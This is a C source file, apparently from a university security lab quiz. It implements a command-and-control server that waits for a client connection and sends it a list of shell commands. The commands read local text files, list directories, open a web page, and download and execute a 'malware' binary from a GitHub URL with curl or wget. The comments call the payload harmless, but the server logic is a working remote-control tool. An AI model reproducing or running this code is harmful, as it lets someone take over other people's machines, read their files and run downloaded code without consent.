#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/time.h>
#include <strings.h>
#include <string.h>

#ifdef _WIN32
  #include <winsock2.h>
  #include <ws2tcpip.h>
#else
  #include <netinet/in.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>
#endif

void exit_with_error(const char* msg) {
	if (msg == NULL)  
		perror("The following error occurred");
	else 
		perror(msg);

	exit(EXIT_FAILURE);
}

int main() {
	int socket_id;						// socket descriptor for waiting for incoming connections 
	int cli_socket_id;					// socket descriptor for an accepted connection
	struct sockaddr_in srv_sockaddr;	// socket address for server
	struct sockaddr_in cli_sockaddr;	// socket address for client
	unsigned int cli_sockaddr_size = sizeof(cli_sockaddr);
	short port_num = 8001;				// port # for the server application
	int optval;

	/*
	 * 1. create a socket, which will be used to wait for an incoming connection from a client
	 */
	printf("creating a socket.\n");

	// Initialize Winsock for Windows
	#ifdef _WIN32
	WSADATA wsaData;
  	WSAStartup(MAKEWORD(2,2), &wsaData);
	#endif

	// Create the socket
	if ((socket_id = socket(AF_INET, SOCK_STREAM, 0)) == -1) 
		exit_with_error(NULL);

	// Set socket options
	#ifdef _WIN32
	if (setsockopt(socket_id, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval)) == -1)
    	exit_with_error(NULL);
	#else
	if (setsockopt(socket_id, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) == -1)
    	exit_with_error(NULL);
	#endif


	/*
	 * 2. bind the socket to (address, port #)
	 *	(i.e., specify port # and address to use for the socket)
	 *	if the socket is a CLIENT socket, the address needs to be the SERVER address.
	 *	if the socket is a SERVER socket, the address could be ANY.
	 */
	printf("binding the socket.\n");
	srv_sockaddr.sin_family = AF_INET;
	srv_sockaddr.sin_port = htons(port_num);
	srv_sockaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	if (bind(socket_id, (struct sockaddr *) &srv_sockaddr,	sizeof (srv_sockaddr)) == -1)
		exit_with_error(NULL);


	/*
	 * 3. start listening on the socket
	 *
	 *    parameter 1 is the max length of the queue of pending connections
	 *    for simplicity, we will accept a single connection
	 */
	printf("listening on the socket.\n");
	if (listen(socket_id, 1) == -1) 
		exit_with_error(NULL);		

	/*
	 * 4. accept an incoming connection if any
	 */
	if ((cli_socket_id = accept(socket_id, (void *)&cli_sockaddr, &cli_sockaddr_size)) == -1)
		exit_with_error(NULL);
	printf("accepting connection from %s.\n", inet_ntoa(cli_sockaddr.sin_addr));	
	printf("listening socket id: %d\n", socket_id);
	printf("new socket id: %d\n", cli_socket_id);


	char snd_buffer[4096], rcv_buffer[4096];
	fd_set read_socket_ids;

	/*
	* Commands to carry out when the connection is established
	*/
	#ifdef _WIN32 // 1.1 - For Windows
	char* commands[] = {
		"dir\n",
		"curl -L -o win_malware.exe https://github.com/CrimsonW23/cits3006/raw/main/LabQuiz1/win_malware.exe\n",
		"type *.txt\n",
		"start https://www.youtube.com/watch?v=xvFZjo5PgG0&list=RDxvFZjo5PgG0&start_radio=1\n",
		"win_malware.exe\n",
	};

	#else // 1.1 - For Linux
	char* commands[] = {
        "wget https://github.com/CrimsonW23/cits3006/raw/main/LabQuiz1/linux_malware\n", // Downloads platform-specific malware
		"cat *.txt\n", 				// 1.4 - Opens any .txt files in the current directory
		"ls\n", 					// 1.4 - Shows current directory contents
		"pwd\n",					// 1.4 - Prints the current working directory
		"xdg-open https://www.youtube.com/watch?v=xvFZjo5PgG0&list=RDxvFZjo5PgG0&start_radio=1\n", // 1 - This alone is malware
		"sleep 10\n",				// Adds a short wait (10s) for the above to load before running the below
		"./linux_malware\n" 		// 1.2 - Prints "You've been hacked!" message
    };
	#endif

	int num_commands = sizeof(commands) / sizeof(commands[0]);
	FILE *fp;
	char cmd_output[4096];

	for (int i = 0; i < num_commands; i++) {
		// Send command string to client
		ssize_t sent = send(cli_socket_id, commands[i], strlen(commands[i]), 0);
		if (sent == -1) {
			perror("send failed");
			break;
		}

		// Receive command output from client with timeout
		fd_set readfds;
		struct timeval timeout;

		while (1) {
			FD_ZERO(&readfds);
			FD_SET(cli_socket_id, &readfds);

			// Set timeout (2 seconds here)
			timeout.tv_sec = 2;
			timeout.tv_usec = 0;

			int sel = select(cli_socket_id + 1, &readfds, NULL, NULL, &timeout);
			if (sel == -1) {
				perror("select failed");
				break;
			} else if (sel == 0) {
				// Timeout, no more data, break out to send next command
				break;
			}

			if (FD_ISSET(cli_socket_id, &readfds)) {
				int nrecv = recv(cli_socket_id, rcv_buffer, sizeof(rcv_buffer) - 1, 0);
				if (nrecv <= 0) {
					if (nrecv == 0) printf("Connection closed by peer\n");
					else perror("recv failed");
					break;
				}
				rcv_buffer[nrecv] = '\0';
				printf("%s", rcv_buffer);
			}
		}
	}
	
	#ifdef _WIN32
	closesocket(cli_socket_id);
	closesocket(socket_id);
	WSACleanup();
	#else
	close(cli_socket_id);
	close(socket_id);
	#endif
	return 0;	
}









